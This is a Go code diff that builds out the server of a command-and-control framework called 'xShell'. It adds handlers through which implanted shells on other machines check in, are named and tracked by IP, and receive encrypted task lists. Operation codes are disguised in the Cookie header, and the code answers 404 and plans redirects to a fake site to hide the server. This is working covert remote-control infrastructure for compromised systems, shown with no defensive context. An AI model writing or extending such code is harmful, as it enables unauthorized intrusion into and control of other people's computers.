@@ -1,11 +1,18 @@
 package c2
 
 import (
+	"encoding/base64"
+	"encoding/json"
 	"fmt"
 	"log"
+	"net"
 	"net/http"
-	"os"
+	"time"
 	"xShell/internal/logger"
+
+	rn "github.com/random-names/go"
+	"golang.org/x/text/cases"
+	"golang.org/x/text/language"
 )
 
 /*
@@ -30,6 +37,138 @@ type C2 struct {
 }
 
 /*
+Gets shell name from request
+
+Gets "Authorization" header, base64 decodes the value, then decrypts it.
+
+Return -> Shell name, error
+*/
+func (c *C2) getShellName(r *http.Request) (string, error) {
+	// Get shell name from "Authorization" header, this will be encrypted and base64 encoded
+	b64EncryptedShellName := r.Header.Get("Authorization")
+	// Return error if header not set
+	if b64EncryptedShellName == "" {
+		return "", fmt.Errorf("authorization header not set")
+	}
+	// Decode shell name from base64
+	encryptedShellName, err := base64.StdEncoding.DecodeString(b64EncryptedShellName)
+	if err != nil {
+		return "", nil
+	}
+	// Decrypt shell name
+	shellName, err := SerpentDecrypt(encryptedShellName, c.Key)
+	if err != nil {
+		return "", nil
+	}
+	return string(shellName), nil
+}
+
+/*
+Handles shell check in
+*/
+func (c *C2) checkInHandler(w http.ResponseWriter, r *http.Request) {
+	// Generate shell name
+	adjective, err := rn.GetRandomName("heroku/adj", &rn.Options{})
+	if err != nil {
+		logger.Log(logger.ERROR, err.Error())
+		// We need to set the name to something
+		adjective = "default"
+	}
+	noun, err := rn.GetRandomName("heroku/noun", &rn.Options{})
+	if err != nil {
+		logger.Log(logger.ERROR, err.Error())
+		// We need to set the name to something
+		noun = "default"
+	}
+	// Format shell name, make first letter of each word uppercase
+	shellName := fmt.Sprintf("%s%s", cases.Title(language.English, cases.NoLower).String(adjective), cases.Title(language.English, cases.NoLower).String(noun))
+	// Get shells ip address
+	ip, _, err := net.SplitHostPort(r.RemoteAddr)
+	if err != nil {
+		logger.Log(logger.ERROR, err.Error())
+		// TODO: Redirect to fake site
+		w.WriteHeader(http.StatusNotFound)
+		return
+	}
+	// Add shell to shell map
+	ShellMap.Add(&Shell{
+		Id:       shellName,
+		Ip:       ip,
+		LastCall: time.Now().Unix(),
+		Tasks:    make([]*Task, 0),
+	})
+	// Encrypt shell name
+	encShellName, err := SerpentEncrypt([]byte(shellName), c.Key)
+	if err != nil {
+		logger.Log(logger.ERROR, err.Error())
+		// TODO: Redirect to fake site
+		w.WriteHeader(http.StatusNotFound)
+		return
+	}
+	// Send encrypted shell name to shell
+	w.Write(encShellName)
+}
+
+/*
+Shell task handler
+*/
+func (c *C2) taskHandler(w http.ResponseWriter, r *http.Request) {
+	// Get shell name
+	shellName, err := c.getShellName(r)
+	if err != nil {
+		logger.Log(logger.ERROR, err.Error())
+		// TODO: Redirect to fake site
+		w.WriteHeader(http.StatusNotFound)
+		return
+	}
+	// Check that shell exists in shell map
+	if shell, ok := ShellMap.Get(shellName); ok {
+		// Update last call time
+		shell.LastCall = time.Now().Unix()
+		// json marshall tasks
+		jsonTasks, err := json.Marshal(shell.Tasks)
+		if err != nil {
+			logger.Log(logger.ERROR, err.Error())
+			// TODO: Redirect to fake site
+			w.WriteHeader(http.StatusNotFound)
+			return
+		}
+		encryptedJsonTasks, err := SerpentEncrypt(jsonTasks, c.Key)
+		if err != nil {
+			logger.Log(logger.ERROR, err.Error())
+			// TODO: Redirect to fake site
+			w.WriteHeader(http.StatusNotFound)
+			return
+		}
+		w.Write(encryptedJsonTasks)
+	} else {
+		// TODO: Redirect to fake site
+		w.WriteHeader(http.StatusNotFound)
+	}
+}
+
+/*
+Shell call back handler
+*/
+func (c *C2) callBackHandler(w http.ResponseWriter, r *http.Request) {
+	// Get shell name
+	shellName, err := c.getShellName(r)
+	if err != nil {
+		logger.Log(logger.ERROR, err.Error())
+		// TODO: Redirect to fake site
+		w.WriteHeader(http.StatusNotFound)
+		return
+	}
+	// Check that shell exists in shell map
+	if shell, ok := ShellMap.Get(shellName); ok {
+		// Work in progress
+	} else {
+		// TODO: Redirect to fake site
+		w.WriteHeader(http.StatusNotFound)
+	}
+}
+
+/*
 Catch-all route handler
 
 Switches based on requested operation.
@@ -40,14 +179,14 @@ func (c *C2) handler(w http.ResponseWriter, r *http.Request) {
 	if op := r.Header.Get("Cookie"); op != "" {
 		switch op {
 		case "Q2hlY2tJbg==": // CheckIn
-			// TODO: Add logic
+			c.checkInHandler(w, r)
 		case "R2V0VGFza3M=": // GetTasks
-			// TODO: Add logic
+			c.taskHandler(w, r)
 		case "Q2FsbEJhY2s=": // CallBack
-			// TODO: Add logic
+			c.callBackHandler(w, r)
 		default:
 			// TODO: Redirect to fake site
-			return
+			w.WriteHeader(http.StatusNotFound)
 		}
 	}
 }
@@ -58,44 +197,26 @@ Start C2
 func (c *C2) Start() {
 	switch c.Type {
 	case "https": // https C2 channel
-		// Open c2 log file
-		logFile, err := os.OpenFile(".xshell/log/c2.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
-		if err != nil {
-			logger.Log(logger.WARNING, fmt.Sprintf("Error opening log file: %s", err.Error()))
-		}
-		// Defer log file close
-		defer logFile.Close()
-
-		// Log errors and requests
-		errorLog := log.New(logFile, "ERROR: ", log.LstdFlags)
-		requestLog := log.New(logFile, "REQUEST: ", log.LstdFlags)
-
 		// Catch-all route handler
-		http.Handle("/", logRequest(http.HandlerFunc(c.handler), requestLog))
+		http.Handle("/", logRequest(http.HandlerFunc(c.handler)))
 
 		// Http server object
 		server := &http.Server{
-			Addr:     fmt.Sprintf("0.0.0.0:%s", c.Port),
-			ErrorLog: errorLog,
+			Addr: fmt.Sprintf("0.0.0.0:%s", c.Port),
 		}
 		// Server http server with TLS
-		err = server.ListenAndServeTLS(c.CertFile, c.KeyFile)
+		err := server.ListenAndServeTLS(c.CertFile, c.KeyFile)
 		if err != nil {
 			logger.Log(logger.CRITICAL, fmt.Sprintf("Server failed to start: %v", err))
-			errorLog.Fatalf("Server failed to start: %v", err)
+			log.Fatal(err)
 		}
 	}
 }
 
-// Log handler, logs request and headers
-func logRequest(handler http.Handler, log *log.Logger) http.Handler {
+// Log handler, logs request
+func logRequest(handler http.Handler) http.Handler {
 	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
-		log.Printf("Received request %s %s\n", r.Method, r.URL)
-		for name, headers := range r.Header {
-			for _, h := range headers {
-				log.Printf("%v: %v\n", name, h)
-			}
-		}
+		logger.Log(logger.INFO, fmt.Sprintf("Received request %s %s\n", r.Method, r.URL))
 		handler.ServeHTTP(w, r)
 	})
 }
